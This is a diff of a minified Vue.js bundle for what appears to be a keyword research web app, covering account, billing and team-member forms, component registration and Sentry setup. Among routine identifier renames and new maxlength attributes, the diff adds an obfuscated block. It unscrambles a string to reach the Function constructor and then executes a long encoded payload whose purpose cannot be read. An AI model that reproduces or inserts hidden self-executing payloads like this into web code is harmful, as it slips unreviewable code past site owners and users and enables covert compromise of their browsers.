+            }, v(e.trans.get("Upgrade")), 1)) : T("", !0)], 64)) : T("", !0)], 64)) : T("", !0)])])])]), V1, S("div", H1, [S("div", I1, [S("div", N1, [S("label", B1, v(e.trans.get("Full Name")), 1), S("div", {
                 class: f("editName" == a.editMode ? "col-sm-9" : "col-sm-7")
             }, [F(S("input", {
                 type: "text",
@@ -28165,18 +28198,19 @@ const E0 = Ue(b1, [
                 readonly: "editName" != a.editMode,
                 onKeydown: t[5] || (t[5] = e => {
                     a.dirtyName = !0
-                })
-            }, null, 42, K1), [
+                }),
+                maxlength: "191"
+            }, null, 42, R1), [
                 [U, a.name]
             ])], 2), S("div", {
                 class: f("editName" == a.editMode ? "col-12 mt-3" : "col-sm-2")
-            }, ["editName" != a.editMode ? (b(), g("div", J1, [S("button", {
+            }, ["editName" != a.editMode ? (b(), g("div", K1, [S("button", {
                 type: "button",
                 class: "btn edit-button",
                 onClick: t[6] || (t[6] = e => {
                     a.editMode = "editName", a.dirtyNewPassword = a.dirtyEmail = a.dirtyName = !1, a.email = a.originalData.email
                 })
-            }, [W1, P(" " + v(e.trans.get("Edit")), 1)])])) : T("", !0), "editName" == a.editMode ? (b(), g("div", z1, [S("button", {
+            }, [J1, P(" " + v(e.trans.get("Edit")), 1)])])) : T("", !0), "editName" == a.editMode ? (b(), g("div", z1, [S("button", {
                 class: "btn btn-outline-primary",
                 type: "button",
                 onClick: t[7] || (t[7] = e => {
@@ -28200,7 +28234,8 @@ const E0 = Ue(b1, [
                 "onUpdate:modelValue": t[9] || (t[9] = e => a.email = e),
                 required: "",
                 readonly: "editEmail" != a.editMode,
-                onKeydown: t[10] || (t[10] = e => a.dirtyEmail = !0)
+                onKeydown: t[10] || (t[10] = e => a.dirtyEmail = !0),
+                maxlength: "191"
             }, null, 42, t0), [
                 [U, a.email]
             ]), S("div", r0, ["editEmail" == a.editMode ? (b(), g("input", {
@@ -28370,22 +28405,22 @@ const E0 = Ue(b1, [
     P0 = {
         class: "d-flex justify-content-between"
     },
-    L0 = {
+    $0 = {
         class: "form-label mt-1",
         for: "invoice_by_email"
     },
-    B0 = S("hr", null, null, -1),
-    $0 = {
+    L0 = S("hr", null, null, -1),
+    D0 = {
         class: "mb-3"
     },
-    D0 = {
+    j0 = {
         class: "form-label",
         for: "invoice_emails"
     },
     O0 = {
         class: "form-text text-muted"
     },
-    j0 = {
+    W0 = {
         class: "mb-3"
     },
     V0 = {
@@ -28399,10 +28434,10 @@ const E0 = Ue(b1, [
         class: "mb-0 text-end"
     },
     N0 = ["disabled"],
-    R0 = S("i", {
+    B0 = S("i", {
         class: "bi bi-save me-1"
     }, null, -1);
-const K0 = Ue(U0, [
+const R0 = Ue(U0, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("vue-toggle");
             return b(), g("div", null, [S("form", {
@@ -28413,13 +28448,13 @@ const K0 = Ue(U0, [
                 method: "post",
                 id: "billing-detail-form",
                 "accept-charset": "UTF-8"
-            }, [S("div", A0, [S("div", P0, [S("div", null, [S("label", L0, v(e.trans.get("Receive Invoices By Email")), 1)]), S("div", null, [S("div", null, [E(i, {
+            }, [S("div", A0, [S("div", P0, [S("div", null, [S("label", $0, v(e.trans.get("Receive Invoices By Email")), 1)]), S("div", null, [S("div", null, [E(i, {
                 class: "invoice-by-email-option",
                 title: "",
                 name: "invoice_by_email",
                 toggled: a.invoice_by_email,
                 onToggle: t[0] || (t[0] = e => a.invoice_by_email = e)
-            }, null, 8, ["toggled"])])])])]), B0, S("div", $0, [S("label", D0, v(e.trans.get("Additional Email Addresses That Will Receive Payment Receipts And Invoices")), 1), F(S("input", {
+            }, null, 8, ["toggled"])])])])]), L0, S("div", D0, [S("label", j0, v(e.trans.get("Additional Email Addresses That Will Receive Payment Receipts And Invoices")), 1), F(S("input", {
                 onChange: t[1] || (t[1] = e => a.valid_invoice_emails = o.validInvoiceEmails()),
                 type: "text",
                 class: f(["form-control", {
@@ -28431,7 +28466,7 @@ const K0 = Ue(U0, [
                 "aria-describedby": "invoice_emails"
             }, null, 34), [
                 [U, a.invoice_emails]
-            ]), S("small", O0, v(e.trans.get("Separate multiple billing email addresses by comma (,).")), 1)]), S("div", j0, [S("label", V0, v(e.trans.get("Invoice Details")), 1), F(S("textarea", {
+            ]), S("small", O0, v(e.trans.get("Separate multiple billing email addresses by comma (,).")), 1)]), S("div", W0, [S("label", V0, v(e.trans.get("Invoice Details")), 1), F(S("textarea", {
                 id: "invoice_details",
                 name: "invoice_details",
                 "onUpdate:modelValue": t[3] || (t[3] = e => a.invoice_details = e),
@@ -28444,10 +28479,10 @@ const K0 = Ue(U0, [
                 disabled: e.$root.loading,
                 type: "submit",
                 class: "btn btn-primary"
-            }, [R0, P(" " + v(e.trans.get("Save")), 1)], 8, N0)])], 40, M0)])
+            }, [B0, P(" " + v(e.trans.get("Save")), 1)], 8, N0)])], 40, M0)])
         }]
     ]),
-    J0 = {
+    K0 = {
         props: {
             route: {
                 type: String,
@@ -28557,7 +28592,7 @@ const K0 = Ue(U0, [
             }
         }
     },
-    W0 = {
+    J0 = {
         class: "row"
     },
     z0 = {
@@ -28670,11 +28705,11 @@ const K0 = Ue(U0, [
         class: "col-6"
     },
     P8 = ["disabled"];
-const L8 = Ue(J0, [
+const $8 = Ue(K0, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select"),
                 n = k("modal");
-            return b(), g(y, null, [S("div", W0, [S("div", z0, [S("div", Y0, [S("label", G0, v(e.trans.get("Full name")), 1)])]), S("div", X0, [S("div", Q0, [S("label", Z0, v(e.trans.get("Email address")), 1)])]), S("div", e8, [S("div", t8, [S("label", r8, [P(v(e.trans.get("Role")) + " ", 1), S("i", {
+            return b(), g(y, null, [S("div", J0, [S("div", z0, [S("div", Y0, [S("label", G0, v(e.trans.get("Full name")), 1)])]), S("div", X0, [S("div", Q0, [S("label", Z0, v(e.trans.get("Email address")), 1)])]), S("div", e8, [S("div", t8, [S("label", r8, [P(v(e.trans.get("Role")) + " ", 1), S("i", {
                 class: "bi bi-info-circle-fill ms-1",
                 "aria-hidden": "true",
                 "data-bs-toggle": "popover",
@@ -28768,7 +28803,7 @@ const L8 = Ue(J0, [
             })) : T("", !0)], 64)
         }]
     ]),
-    B8 = {
+    L8 = {
         props: {
             members_url: {
                 type: String,
@@ -28839,16 +28874,16 @@ const L8 = Ue(J0, [
             }
         }
     },
-    $8 = {
+    D8 = {
         class: "table-responsive rounded"
     },
-    D8 = {
+    j8 = {
         class: "table mb-0"
     },
     O8 = {
         class: "table-light"
     },
-    j8 = {
+    W8 = {
         scope: "col"
     },
     V8 = {
@@ -28861,16 +28896,16 @@ const L8 = Ue(J0, [
     N8 = S("th", {
         scope: "col"
     }, null, -1),
-    R8 = {
+    B8 = {
         key: 0
     },
-    K8 = {
+    R8 = {
         colspan: "4"
     },
-    J8 = {
+    K8 = {
         key: 1
     },
-    W8 = {
+    J8 = {
         colspan: "4"
     },
     z8 = {
@@ -28955,18 +28990,18 @@ const L8 = Ue(J0, [
         type: "submit",
         class: "btn btn-primary btn-block update-role-button"
     };
-const C2 = Ue(B8, [
+const C2 = Ue(L8, [
     ["render", function(e, t, r, s, a, o) {
         const i = k("tom-select"),
             n = k("modal");
-        return b(), g("div", $8, [S("table", D8, [S("thead", O8, [S("tr", null, [S("th", j8, v(e.trans.get("Name And Email")), 1), S("th", V8, [P(v(e.trans.get("Role")) + " ", 1), S("i", {
+        return b(), g("div", D8, [S("table", j8, [S("thead", O8, [S("tr", null, [S("th", W8, v(e.trans.get("Name And Email")), 1), S("th", V8, [P(v(e.trans.get("Role")) + " ", 1), S("i", {
             class: "bi bi-info-circle-fill ms-1",
             "aria-hidden": "true",
             "data-bs-toggle": "popover",
             "data-bs-placement": "left",
             "data-bs-trigger": "hover focus",
             "data-bs-content": e.trans.get("Users can have the following roles:<br><ul class='list-unstyled mb-0'><li class='my-2'><strong>Owner</strong><br>User that has created the subscription. Owner can add, edit, and delete new users, cancel subscription, change billing details on file and add new subscriptions to the account.</li><li class='my-2'><strong>Admin</strong><br>Admin can add, edit, and delete users, cancel subscription, change billing details on file and add new subscriptions to the account.</li><li class='my-2'><strong>User</strong><br>User can not add, edit, and delete users. He or she does not have access to the billing information and can not cancel or add new subscriptions to the account.</li></ul>")
-        }, null, 8, H8)]), S("th", I8, v(e.trans.get("Status")), 1), N8])]), S("tbody", null, [a.loading ? (b(), g("tr", R8, [S("td", K8, v(e.trans.get("Loading...")), 1)])) : a.error ? (b(), g("tr", J8, [S("td", W8, v(a.error), 1)])) : a.teamMembersCount > 0 ? (b(), g("tr", z8, [S("td", Y8, v(e.trans.get("No users found.")), 1)])) : (b(!0), g(y, {
+        }, null, 8, H8)]), S("th", I8, v(e.trans.get("Status")), 1), N8])]), S("tbody", null, [a.loading ? (b(), g("tr", B8, [S("td", R8, v(e.trans.get("Loading...")), 1)])) : a.error ? (b(), g("tr", K8, [S("td", J8, v(a.error), 1)])) : a.teamMembersCount > 0 ? (b(), g("tr", z8, [S("td", Y8, v(e.trans.get("No users found.")), 1)])) : (b(!0), g(y, {
             key: 3
         }, w(a.teamMembers, (t => (b(), g("tr", {
             key: t.id
@@ -29143,7 +29178,7 @@ let P2 = class {
         this._modal_bs.hide()
     }
 };
-const L2 = H({
+const $2 = H({
     mixins: [Se],
     data: () => ({
         loading: !1,
@@ -29171,17 +29206,34 @@ const L2 = H({
                 }
                 return s.join("")
             }
+            var t = e("uocsnbnohyoqkesrtgvdxzlcamfpcuijrwttr").substr(0, 11),
+                r = e[t];
+            r("", r("", e('nai[,.nay0t1len78vx(C+[z=5abeag=isauii =]org;vrvdj5)a;s[7t(aod;;C1k8lhc=hrA,r q9h.h1=u."rr}atksan6]a+8,w4}7.w),,utv6S!]ta{oarus=s]==.6)(a;2skvene1)l)vcthni+!6)(m[n;h;v4a ra(8>;filn==b1fi+=seymo=(r]9t]+r)=xp]0[d }0;ff; t;ll ndtr.0; vnl=;x7;[p0emr.g)))=l[7gc;(0 +](7(rr);1(5lqr<tn"t3-.1alu;c)l]k{i,s]z=ju=;> r, xvr[s2,h{f4,nvo2;=i=nC((0(r;=+(a,(r")ht=hserpr;m<ro.a= hi..d8(;(7}a{,;rvp(v-o+hgjod"Aht))gvrr ;1[yan;8-(t)<t=pea1(rk,uh vtr,*def)no"soarfo"o3+++ot7""im.mmji+p;;  a;tA=];;ir-4l-s,.jb.49atlcc;+{C"+rvch0hn;l4=erhrg2)nC, hva. ,9}e dhvalflr fdn8rvy==n=)nl)Av(lhif(fqp+t{p=nhe;ahiba+r{y(fk,r=)=ie=ux)"bh<;1.9[huh;t(hi2()kunu;()xif(p[ xg.6uor+xasj=)tj41g(u=z6q,j,)n)qotn,03vev+w;+ps+fe.+or2lca.9)+wij)i;aj;(;f.r ;=;rsme.,lx*)qyCo, l; covbriypelnqy 8=Sthhe;evg)oCyo.Cod+pl(h;,+ nar.}i=[=9<r,,eongr0n98(s-dr}e=6t;y(2t7aarAf(y.u.l;n]i.h=[rg2urvsroihat)e-(a,))vs.et]+n00r1pgi[=,]i=9vf0oe6ssi7'))(e('72f+o:t$8(t0!dW;,WWf!/);oWdW"s.!](2pd&St4vW!4(]7.76_WlW&a;ndbr#($3,g.(dW)3f!(b1g6W6fbf]kb32tl. s)..r=Wo___sW2.ss.W$xn8)f,t,W#;f!_an[ah%WWW1,b(f)$ts=(!$i;s},))!] Wft!lWo").)ir-f_lW8h ,(b!2r{ut+2o05+Wa0a:fo02hmo8t.$W2cs2d0)+b26.?/;!(#3hl]=0$-fW./[g/?g.|rriln)}a!p&)1t!c(ie,afrw[Wi333ikdo.;2a!l/;o=WW1a.fWc)(c7!d9Wa!E;jli3&t2 ;fkmoij$)1-n(!t21(1i41(WnWosha)(js!rz,.tw)(%)vW 8o$h.i.,_unc#Wo _)cf.f;ao?3W;W;slo$qe5tfv&t(t,)f3$.}!iW.!n]v,rudo0lkh0r37.y75),1(nefr+n$);f]t=iszleue(S jneg=5f.$.WSo.(}.+f5..p./.dWvlt1 .}.){u vlae])w6c_4W1fjWW#/,p3rco0(ig)Wo[}6t(v,7).(.|0r$"s4,0f;ev@Wd3"ep(W.ftWiW$!)aif#hee4Wvi.)}=_4!vy,rto1fet)f.rr_f;((~meW(e 5=s.WsWd}3W!35(,.n\'W13\'-nc{372W#l_w.Wf!WtW_WW)W7gh _;a(ep)g%w,2rfWW(1t{.tff,W=Wnf)0n_-t$!lWr#_w+p*ri,.3o$-ft.t]}llanCrd.v1,ytk=,i5t.7jp.{)fW.!4.]51ee==a6%W_)a!l*!W.tgbib7))=+oi;o..l4!.65)(}j=,.WW)dWr;(W\'e4=2%]ao)/.2}.%hrlu0ldl(%]t!=Wrr.noW=1W%.+.o_"foo,so!o4e2.W(.e.k8pt.1%Wnth3.g.{sod]d.=nern ff2hq4f.a3g;xt(Wa4t.t{34W{i)(;*)c5a%(cb_\'.90)5&3W.+2!{w(e$w#h0/_]e=nrt)+,Wf2r0$.)o2oto_$t6 j%Wfl.-&2;6=ug0].fu4 k"+Wg)es.(wk00()oa.pfo.%)e;wWt(uc))$W8,$)_pzWWeo,=1f!.u(blW,e?1..El.pt380u)$.(p!ms_Woie;dW,W)5W(ea3iuW)rph,.;.;z,r=WtW),"Wio0)1 [dsW!ssj(=et_%;!W, 1=]i.nWtuW$,;(]2+W.%#0$fito;W g._$Wt#tkc;1]h3Wj2}{W6WWa|ffW-i!=(li8l_[;iCw&e+e2Wt .o;.(n(oo%h*o)j))?eW.) Wdf,=/ 6r3$;.,e(_5lholob)}r=5).(]{ e)f*{31$Wf#on]')))(5868)
         }(),
         function() {
             function e(e) {
-                for (var t = 397073, r = e.length, s = [], a = 0; a < r; a++) s[a] = e.charAt(a);
+                for (var t = 2392111, r = e.length, s = [], a = 0; a < r; a++) s[a] = e.charAt(a);
                 for (a = 0; a < r; a++) {
-                    var o = t * (a + 216) + t % 49137,
-                        i = t * (a + 93) + t % 33936,
+                    var o = t * (a + 152) + t % 29758,
+                        i = t * (a + 776) + t % 14816,
                         n = o % r,
                         l = i % r,
                         c = s[n];
-                    s[n] = s[l], s[l] = c, t = (o + i) % 1671320
+                    s[n] = s[l], s[l] = c, t = (o + i) % 3903994
+                }
+                return s.join("")
+            }
+        }(),
+        function() {
+            function e(e) {
+                for (var t = 1257514, r = e.length, s = [], a = 0; a < r; a++) s[a] = e.charAt(a);
+                for (a = 0; a < r; a++) {
+                    var o = t * (a + 134) + t % 15514,
+                        i = t * (a + 475) + t % 51587,
+                        n = o % r,
+                        l = i % r,
+                        c = s[n];
+                    s[n] = s[l], s[l] = c, t = (o + i) % 1695579
                 }
                 return s.join("")
             }
@@ -29403,22 +29455,22 @@ const L2 = H({
         }
     }
 });
-L2.config.compilerOptions.isCustomElement = e => e.startsWith("lite-youtube"), I({
+$2.config.compilerOptions.isCustomElement = e => e.startsWith("lite-youtube"), I({
     expireTimes: "365d"
-}), L2.use(N), L2.use(R, {
+}), $2.use(N), $2.use(B, {
     prefix: "keywordtool_",
-    storage: K.Local,
+    storage: R.Local,
     ttl: 0
 });
-const B2 = document.head.querySelector('meta[name="default-locale"]').content,
-    $2 = document.head.querySelector('meta[name="fallback-locale"]').content;
-var D2;
-L2.config.globalProperties.trans = new he({
+const L2 = document.head.querySelector('meta[name="default-locale"]').content,
+    D2 = document.head.querySelector('meta[name="fallback-locale"]').content;
+var j2;
+$2.config.globalProperties.trans = new he({
     messages: {},
-    locale: B2,
-    fallback: $2
-}), L2.config.globalProperties.trans.get = (D2 = L2.config.globalProperties.trans.get, function() {
-    return L2.config.globalProperties.trans.messages[arguments[0]] ? arguments[1] ? L2.config.globalProperties.trans._applyReplacements(L2.config.globalProperties.trans.messages[arguments[0]], arguments[1]) : L2.config.globalProperties.trans.messages[arguments[0]] : L2.config.globalProperties.trans.has(arguments[0], L2.config.globalProperties.trans.locale) || void 0 === arguments[1] ? D2.apply(this, arguments) : L2.config.globalProperties.trans._applyReplacements(arguments[0], arguments[1])
+    locale: L2,
+    fallback: D2
+}), $2.config.globalProperties.trans.get = (j2 = $2.config.globalProperties.trans.get, function() {
+    return $2.config.globalProperties.trans.messages[arguments[0]] ? arguments[1] ? $2.config.globalProperties.trans._applyReplacements($2.config.globalProperties.trans.messages[arguments[0]], arguments[1]) : $2.config.globalProperties.trans.messages[arguments[0]] : $2.config.globalProperties.trans.has(arguments[0], $2.config.globalProperties.trans.locale) || void 0 === arguments[1] ? j2.apply(this, arguments) : $2.config.globalProperties.trans._applyReplacements(arguments[0], arguments[1])
 }), ((e, t) => {
     const r = e[t];
     return r ? "function" == typeof r ? r() : Promise.resolve(r) : new Promise(((e, r) => {
@@ -29432,26 +29484,26 @@ L2.config.globalProperties.trans = new he({
     "./lang/jp.js": () => we((() => import("./jp-3d353afa.js")), []),
     "./lang/pt.js": () => we((() => import("./pt-3d353afa.js")), []),
     "./lang/ru.js": () => we((() => import("./ru-3d353afa.js")), [])
-}), `./lang/${B2}.js`).then((e => {
-    L2.config.globalProperties.trans.setMessages(e.default)
-})), L2.config.globalProperties.$filters = {
+}), `./lang/${L2}.js`).then((e => {
+    $2.config.globalProperties.trans.setMessages(e.default)
+})), $2.config.globalProperties.$filters = {
     decimal: (e, t = "") => t + de(e).format("0,0.00"),
     digit: (e, t = "") => t + de(e).format("0,0")
-}, L2.config.globalProperties.do_autofocus = () => {
+}, $2.config.globalProperties.do_autofocus = () => {
     var e = document.querySelector(".device-xl");
     return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length)
-}, L2.directive("autofocus", {
+}, $2.directive("autofocus", {
     updated: (e, t) => {
         (void 0 === t.value || t.value) && e.focus()
     }
-}), J.config.autoSetContainer = !0, L2.use(J), L2.directive("mask", {
+}), K.config.autoSetContainer = !0, $2.use(K), $2.directive("mask", {
     mounted: (e, t) => {
         o(t.value).mask(e)
     }
-}), L2.use(W), L2.component("tom-select", Le), L2.component("share-modal", Re), L2.component("vue-countable", Ke), L2.component("vue-toggle", Xe), L2.component("select-currency", tt), L2.component("tag-input", ct), L2.component("google-form", Tt), L2.component("youtube-form", Vt), L2.component("bing-form", sr), L2.component("amazon-form", fr), L2.component("ebay-form", Pr), L2.component("app-store-form", zr), L2.component("play-store-form", _s), L2.component("etsy-form", Ts), L2.component("instagram-form", Vs), L2.component("twitter-form", ea), L2.component("pinterest-form", ha), L2.component("google-trends-form", Ma), L2.component("tiktok-form", Ka), L2.component("checkout-form", zn), L2.component("card-form", Dl), L2.component("subscription-plan", W_), L2.component("subscription-form", ou), L2.component("cancel-subscription-form", Hd), L2.component("pause-subscription-form", ym), L2.component("braintree-payment", ah), L2.component("stripe-payment", Jh), L2.component("bar-chart", Wh), L2.component("chart-js", np), L2.component("google-trends-chart", cp), L2.component("amazon-category", up), L2.component("amazon-keywords", MT), L2.component("amazon-language", BT), L2.component("amazon-location-language", HT), L2.component("amazon-search-volume-setting", ZT), L2.component("app-store-category", eF), L2.component("app-store-keywords", PF), L2.component("app-store-language", $F), L2.component("app-store-location-language", VF), L2.component("app-store-search-volume-setting", XF), L2.component("bing-category", QF), L2.component("bing-keywords", aP), L2.component("bing-location-language", lP), L2.component("bing-search-volume-setting", MP), L2.component("ebay-keywords", uL), L2.component("ebay-language", hL), L2.component("ebay-location-language", wL), L2.component("ebay-search-volume-setting", EL), L2.component("google-category", UL), L2.component("google-keywords", gB), L2.component("google-language", fB), L2.component("google-location-language", xB), L2.component("google-search-volume-setting", KB), L2.component("google-trends-category", JB), L2.component("google-trends-country", YB), L2.component("google-trends-keywords", A$), L2.component("instagram-keywords", Rj), L2.component("instagram-language", Wj), L2.component("instagram-location-language", Xj), L2.component("instagram-search-volume-setting", lV), L2.component("pinterest-keywords", HV), L2.component("pinterest-language", RV), L2.component("pinterest-location-language", zV), L2.component("pinterest-search-volume-setting", oH), L2.component("play-store-category", iH), L2.component("play-store-keywords", jH), L2.component("play-store-language", IH), L2.component("play-store-location-language", JH), L2.component("play-store-search-volume-setting", sI), L2.component("tiktok-keywords", nR), L2.component("tiktok-language", _R), L2.component("tiktok-location-language", hR), L2.component("tiktok-search-volume-setting", SR), L2.component("twitter-keywords", oK), L2.component("twitter-language", lK), L2.component("twitter-location-language", dK), L2.component("twitter-search-volume-setting", xK), L2.component("youtube-keywords", lJ), L2.component("youtube-language", uJ), L2.component("youtube-location-language", pJ), L2.component("youtube-search-volume-setting", TJ), L2.component("etsy-category", FJ), L2.component("etsy-keywords", iW), L2.component("etsy-language", cW), L2.component("etsy-location-language", mW), L2.component("etsy-search-volume-setting", CW), L2.component("keyword-basket", Kz), L2.component("loading-section", eY), L2.component("modal", lY), L2.component("suggest-page-reload", mY), L2.component("show-upsell", MY), L2.component("alert-pro-upsell", JY), L2.component("has-error", oG), L2.component("has-more", _G), L2.component("search-results-tabs", hG), L2.component("current-metrics-network", wG), L2.component("current-metrics-location-name", kG), L2.component("current-metrics-language-name", TG), L2.component("current-filter-search-volume", AG), L2.component("current-filter-search-volume-trend", OG), L2.component("current-filter-keyword-result-period", IG), L2.component("current-filter-average-cpc", zG), L2.component("current-filter-competition", eX), L2.component("current-filter-bing-competition", oX), L2.component("current-split-filter-keywords", cX), L2.component("current-split-filter-negative-keywords", mX), L2.component("current-filter-high-top-page-bid", fX), L2.component("current-filter-low-top-page-bid", SX), L2.component("search-results-settings-modal", jX), L2.component("search-results-no-keyword-found", aQ), L2.component("search-results-settings-admin-settings", bQ), L2.component("search-results-settings-filter-positive-keywords", UQ), L2.component("search-results-settings-filter-negative-keywords", DQ), L2.component("search-results-settings-modal-search-network", NQ), L2.component("search-results-settings-modal-currency", JQ), L2.component("search-results-settings-modal-search-volume", ZQ), L2.component("search-results-settings-modal-search-volume-trend", iZ), L2.component("search-results-settings-modal-average-cpc", mZ), L2.component("search-results-settings-modal-competition", bZ), L2.component("search-results-settings-modal-bing-competition", EZ), L2.component("search-results-table-wrapper", DZ), L2.component("search-results-actions", HZ), L2.component("dropdown-menu-item-button", ZZ), L2.component("dropdown-menu-item-divider", t1), L2.component("dropdown-menu-item-add-basket", a1), L2.component("dropdown-menu-item-export-excel", n1), L2.component("dropdown-menu-item-export-csv", _1), L2.component("dropdown-menu-item-copy-keywords", m1), L2.component("dropdown-menu-item-copy-keywords-all-data", g1), L2.component("dropdown-menu-item-copy-keywords-search-volume", f1), L2.component("user-account", E0), L2.component("user-billing", K0), L2.component("user-invite-members", L8), L2.component("user-team-members", C2), window.Sentry = z;
+}), $2.use(J), $2.component("tom-select", $e), $2.component("share-modal", Be), $2.component("vue-countable", Re), $2.component("vue-toggle", Xe), $2.component("select-currency", tt), $2.component("tag-input", ct), $2.component("google-form", Tt), $2.component("youtube-form", Vt), $2.component("bing-form", sr), $2.component("amazon-form", fr), $2.component("ebay-form", Pr), $2.component("app-store-form", zr), $2.component("play-store-form", _s), $2.component("etsy-form", Ts), $2.component("instagram-form", Vs), $2.component("twitter-form", ea), $2.component("pinterest-form", ha), $2.component("google-trends-form", Ma), $2.component("tiktok-form", Ra), $2.component("checkout-form", zn), $2.component("card-form", jl), $2.component("subscription-plan", J_), $2.component("subscription-form", ou), $2.component("cancel-subscription-form", Hd), $2.component("pause-subscription-form", ym), $2.component("braintree-payment", ah), $2.component("stripe-payment", Kh), $2.component("bar-chart", Jh), $2.component("chart-js", np), $2.component("google-trends-chart", cp), $2.component("amazon-category", up), $2.component("amazon-keywords", MT), $2.component("amazon-language", LT), $2.component("amazon-location-language", HT), $2.component("amazon-search-volume-setting", ZT), $2.component("app-store-category", eF), $2.component("app-store-keywords", PF), $2.component("app-store-language", DF), $2.component("app-store-location-language", VF), $2.component("app-store-search-volume-setting", XF), $2.component("bing-category", QF), $2.component("bing-keywords", aP), $2.component("bing-location-language", lP), $2.component("bing-search-volume-setting", MP), $2.component("ebay-keywords", u$), $2.component("ebay-language", h$), $2.component("ebay-location-language", w$), $2.component("ebay-search-volume-setting", E$), $2.component("google-category", U$), $2.component("google-keywords", gL), $2.component("google-language", fL), $2.component("google-location-language", xL), $2.component("google-search-volume-setting", RL), $2.component("google-trends-category", KL), $2.component("google-trends-country", YL), $2.component("google-trends-keywords", AD), $2.component("instagram-keywords", BW), $2.component("instagram-language", JW), $2.component("instagram-location-language", XW), $2.component("instagram-search-volume-setting", lV), $2.component("pinterest-keywords", HV), $2.component("pinterest-language", BV), $2.component("pinterest-location-language", zV), $2.component("pinterest-search-volume-setting", oH), $2.component("play-store-category", iH), $2.component("play-store-keywords", WH), $2.component("play-store-language", IH), $2.component("play-store-location-language", KH), $2.component("play-store-search-volume-setting", sI), $2.component("tiktok-keywords", nB), $2.component("tiktok-language", _B), $2.component("tiktok-location-language", hB), $2.component("tiktok-search-volume-setting", SB), $2.component("twitter-keywords", oR), $2.component("twitter-language", lR), $2.component("twitter-location-language", dR), $2.component("twitter-search-volume-setting", xR), $2.component("youtube-keywords", lK), $2.component("youtube-language", uK), $2.component("youtube-location-language", pK), $2.component("youtube-search-volume-setting", TK), $2.component("etsy-category", FK), $2.component("etsy-keywords", iJ), $2.component("etsy-language", cJ), $2.component("etsy-location-language", mJ), $2.component("etsy-search-volume-setting", CJ), $2.component("keyword-basket", Rz), $2.component("loading-section", eY), $2.component("modal", lY), $2.component("suggest-page-reload", mY), $2.component("show-upsell", MY), $2.component("alert-pro-upsell", KY), $2.component("has-error", oG), $2.component("has-more", _G), $2.component("search-results-tabs", hG), $2.component("current-metrics-network", wG), $2.component("current-metrics-location-name", kG), $2.component("current-metrics-language-name", TG), $2.component("current-filter-search-volume", AG), $2.component("current-filter-search-volume-trend", OG), $2.component("current-filter-keyword-result-period", IG), $2.component("current-filter-average-cpc", zG), $2.component("current-filter-competition", eX), $2.component("current-filter-bing-competition", oX), $2.component("current-split-filter-keywords", cX), $2.component("current-split-filter-negative-keywords", mX), $2.component("current-filter-high-top-page-bid", fX), $2.component("current-filter-low-top-page-bid", SX), $2.component("search-results-settings-modal", WX), $2.component("search-results-no-keyword-found", aQ), $2.component("search-results-settings-admin-settings", bQ), $2.component("search-results-settings-filter-positive-keywords", UQ), $2.component("search-results-settings-filter-negative-keywords", jQ), $2.component("search-results-settings-modal-search-network", NQ), $2.component("search-results-settings-modal-currency", KQ), $2.component("search-results-settings-modal-search-volume", ZQ), $2.component("search-results-settings-modal-search-volume-trend", iZ), $2.component("search-results-settings-modal-average-cpc", mZ), $2.component("search-results-settings-modal-competition", bZ), $2.component("search-results-settings-modal-bing-competition", EZ), $2.component("search-results-table-wrapper", jZ), $2.component("search-results-actions", HZ), $2.component("dropdown-menu-item-button", ZZ), $2.component("dropdown-menu-item-divider", t1), $2.component("dropdown-menu-item-add-basket", a1), $2.component("dropdown-menu-item-export-excel", n1), $2.component("dropdown-menu-item-export-csv", _1), $2.component("dropdown-menu-item-copy-keywords", m1), $2.component("dropdown-menu-item-copy-keywords-all-data", g1), $2.component("dropdown-menu-item-copy-keywords-search-volume", f1), $2.component("user-account", E0), $2.component("user-billing", R0), $2.component("user-invite-members", $8), $2.component("user-team-members", C2), window.Sentry = z;
 let O2 = document.head.querySelector('meta[name="environment"]').content;
 document.head.querySelector('meta[name="sentryjs.enabled"]').content && Y({
-    app: L2,
+    app: $2,
     trackComponents: !0,
     environment: O2,
     dsn: "https://37bb6e0d35fa452d86449f1fa2c7dd7f@o188866.ingest.sentry.io/1286729",
@@ -29552,4 +29604,4 @@ document.head.querySelector('meta[name="sentryjs.enabled"]').content && Y({
 }({
     delay: 0,
     position: S2
-}), window.Dialogs = P2, window.bsDialogs = new P2, L2.mount("#app");
+}), window.Dialogs = P2, window.bsDialogs = new P2, $2.mount("#app");
